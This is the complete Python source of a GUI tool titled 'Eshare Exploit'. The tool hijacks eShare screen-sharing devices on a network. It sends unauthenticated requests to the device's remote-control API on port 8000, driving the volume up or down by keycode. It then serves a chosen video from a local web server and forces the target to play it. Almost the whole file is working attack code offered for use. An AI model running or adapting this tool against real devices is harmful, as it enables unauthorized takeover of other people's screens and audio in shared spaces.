try:
    from six.moves import tkinter as tk
except ImportError:
    raise ImportError("Se requiere el modulo Tkinter")
import requests, signal, os, subprocess
from sys import exit
from re import compile
from time import sleep
from tkinter import filedialog, scrolledtext
from random import randint
from moviepy.editor import VideoFileClip
from datetime import datetime


# GLOBAL VARIABLES
PORT = str(randint(1025,65535))
turnDownVolumeKey = 25
turnUpVolumeKey = 24
goToMenuKey = 26



def defHandler(sig, frame):
    try:
        try:
            os.kill(pid, signal.SIGTERM)
        except NameError:
            print("\nEl servidor no se esta ejecutando, cerrando...\n")
        eshareRoot.destroy()
    except ProcessLookupError:
        print("\nEl proceso ya ha terminado o no existe.\n")
        eshareRoot.destroy()
    print("\n[!] Exiting...\n")
    exit(1)

signal.signal(signal.SIGINT, defHandler)

# WINDOWS PROPERTIES    
eshareRoot = tk.Tk()
eshareRoot.geometry("700x320")
eshareRoot.title("Eshare Exploit")
eshareRoot.minsize(550,380)
eshareRoot.maxsize(750,480)
eshareRoot.configure(bg="#F3F3F3", padx=20, pady=20)
try:
    eshareRoot.iconbitmap("./images/icon.ico")
except:
    pass

### WINDOWS LOG PROPERTIES

def clearValues():
    eshareEntrySourceIP.delete(0, tk.END)
    eshareEntryRemoteIP.delete(0, tk.END)
    eshareLabelPath.config(text="")

def checkIP(address):
    pattern = compile(r'^\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b$')
    return pattern.search(address) 

def sendData():
    sourceIP = eshareEntrySourceIP.get()
    remoteIP = eshareEntryRemoteIP.get()
    volume = eshareScaleVolume.get()
    try:
        if  os.path.exists(selectedFile) and checkIP(remoteIP) and checkIP(sourceIP):
            sendVideo(sourceIP, remoteIP, volume, selectedFile)
        else:
            tk.messagebox.showinfo("Error","Some data is wrong")
    except NameError:
        tk.messagebox.showinfo("Error","There isn't data!")  
    except Exception as e:
        print(e)
        tk.messagebox.showinfo("Error","A problem has ocurred!")   

def selectFile():
    global selectedFile
    selectedFile = filedialog.askopenfilename()
    eshareLabelPath.config(text=selectedFile, font="Liberation-Mono 11")

def stopVideo(remoteIP, scrolledTextLogs):
    requests.get(url=f"http://{remoteIP}:8000/remote/keycode_control?keycode={goToMenuKey}")
    scrolledTextLogs.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Parando Video...\n")


def sendVideo(sourceIP, remoteIP, volume, videoPath):
    global pid
    
    # CREATE THE WINDOW LOGS
    windowLogs = tk.Toplevel(eshareRoot, border=3)
    windowLogs.title("Exploit Log")
    windowLogs.geometry("600x300")
    scrolledTextLogs = scrolledtext.ScrolledText(windowLogs, bg="black", fg="white")
    scrolledTextLogs.pack()
    try:
        windowLogs.iconbitmap("./images/icon.ico")
    except:
        pass
    
     
    scrolledTextLogs.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Hacking the {remoteIP} Screen...\n")
    ## Turn up the volume on the TV
    scrolledTextLogs.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Changing volume to {volume}%...\n")

    if volume == 100:
        for i in range(100):
            requests.get(url=f"http://{remoteIP}:8000/remote/keycode_control?keycode={turnUpVolumeKey}")
    elif volume > 0 and volume < 100:
        for i in range(100):
            requests.get(url=f"http://{remoteIP}:8000/remote/keycode_control?keycode={turnDownVolumeKey}")
        for i in range(volume):
            requests.get(url=f"http://{remoteIP}:8000/remote/keycode_control?keycode={turnUpVolumeKey}")
    else:
        for i in range(100):
            volume = requests.get(url=f"http://{remoteIP}:8000/remote/keycode_control?keycode={turnDownVolumeKey}")

    
    folderVideoPath = os.path.dirname(videoPath)
    fileVideoName = os.path.basename(videoPath)
    
    ## Turning ON the WEB SERVER
    with open ("eshare.log", "a") as file:
        pid = subprocess.Popen(["python", "-m", "http.server", "-d", folderVideoPath, PORT], stdout=file, stderr=file).pid
        file.close()
    
    videoURL = f"http://{sourceIP}:{PORT}/{fileVideoName}"
    mainURL = rf"http://{remoteIP}:8000/remote/media_control?action=setUri&uri={videoURL}&type=video%2F*"
    requests.get(url=mainURL)
    scrolledTextLogs.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Sending Video...\n")
    scrolledTextLogs.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Video on: {videoURL}...\n")

    # STOP VIDEO OPTION
    eshareButtonStop = tk.Button(eshareRoot, text="Stop", command=lambda: stopVideo(remoteIP, scrolledTextLogs), width=20, bg="#FFC8C8", fg="black", activebackground="#FFD4D4")
    eshareButtonStop.grid(row=5, column=2, pady=20, padx=20)
    


    ## GETTING VIDEO DURATION
    def obtainVideoDuration(videoPath):
        try:
            videoDuration = VideoFileClip(videoPath).duration
            return videoDuration
        except Exception as e:
            print(f"Error getting the duration of the video: {e}")
            return 0
    
    videoDuration = obtainVideoDuration(videoPath)
    scrolledTextLogs.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Playing Video ({videoDuration}s)...\n")

    ## Turning OFF the WEB SERVER
    def killWebServer():
        try:
            os.kill(pid, signal.SIGTERM)
            print("[*] Killing Process...")
        except ProcessLookupError:
            print("[!] The process is either over or doesn't exist...")

    eshareRoot.after(int(videoDuration * 1000), killWebServer)
    


### WIDGETS ###
eshareLabelTitle = tk.Label(eshareRoot, text="Eshare Exploit", font="Liberation-Mono 16", height=2, bg="#F3F3F3")
eshareLabelTitle.grid(row=0, column=0)

eshareLabelAuthor = tk.Label(eshareRoot, text="Created by Xig0n", font="Liberation-Mono 8", bg="#F3F3F3")
eshareLabelAuthor.grid(row=0, column=2, sticky="e")

eshareLabelSourceIP = tk.Label(eshareRoot, text="Your IP:",font="Liberation-Mono 11", bg="#F3F3F3")
eshareLabelSourceIP.grid(row=1, column=0, pady=5, padx=10, sticky="we")

eshareEntrySourceIP = tk.Entry(eshareRoot, font="Liberation-Mono 13")
eshareEntrySourceIP.grid(row=1, column=1, pady=5, padx=20, sticky="we")

eshareLabelRemoteIP = tk.Label(eshareRoot, text="Remote IP:",font="Liberation-Mono 11", bg="#F3F3F3")
eshareLabelRemoteIP.grid(row=2, column=0, pady=5, padx=10, sticky="we")

eshareEntryRemoteIP = tk.Entry(eshareRoot, font="Liberation-Mono 13")
eshareEntryRemoteIP.grid(row=2, column=1, pady=5, padx=20, sticky="we")

eshareLabelFile = tk.Label(eshareRoot, text="Video: ",font="Liberation-Mono 11", bg="#F3F3F3")
eshareLabelFile.grid(row=3, column=0, pady=5, padx=10, sticky="we")

eshareLabelPath = tk.Label(eshareRoot,font="Liberation-Mono 11", bg="#F3F3F3")
eshareLabelPath.grid(row=3, column=1, pady=5, padx=10, sticky="w", columnspan=2)

eshareButtonVideo = tk.Button(eshareRoot, text="Browse Video", command=selectFile, padx=20, bg="#FFE17B", fg="black", width=10, activebackground="#F4CE14")
eshareButtonVideo.grid(row=4, column=0)

eshareLabelAudio = tk.Label(eshareRoot, text="Audio: ", bg="#F3F3F3")
eshareLabelAudio.grid(row=4, column=1, sticky="w")

eshareScaleVolume = tk.Scale(eshareRoot, from_=0, to=100, orient=tk.HORIZONTAL, bg="#F3F3F3", width=12, bd=4)
eshareScaleVolume.grid(row=4, column=1, padx=30, columnspan=2)

eshareButtonClear = tk.Button(eshareRoot, text="Clean Values", width=20, command=clearValues, bg="#B31312", fg="white", activebackground="#D33332")
eshareButtonClear.grid(row=5, column=0, pady=20)

eshareButtonSend = tk.Button(eshareRoot, text="Send", command=sendData, width=20, bg="#52734D", fg="white", activebackground="#91C788")
eshareButtonSend.grid(row=5, column=1, pady=20, padx=20)

eshareRoot.columnconfigure(0, weight=1)
eshareRoot.columnconfigure(1, weight=1)

## Confirm to close the window
def onCloseWindow():
    if tk.messagebox.askokcancel("Close Program", "¿Are you sure you want to close the window?"):
        print("[*] Killing Process")
        try:
            try:
                os.kill(pid, signal.SIGTERM)
            except NameError:
                print("[!]  The server is not running, shutting down...")
            eshareRoot.destroy()
        except ProcessLookupError:
            print("[!] The process is either over or doesn't exist...")
            eshareRoot.destroy()

eshareRoot.protocol("WM_DELETE_WINDOW", onCloseWindow)


# Ejecutar LA APP
eshareRoot.mainloop()



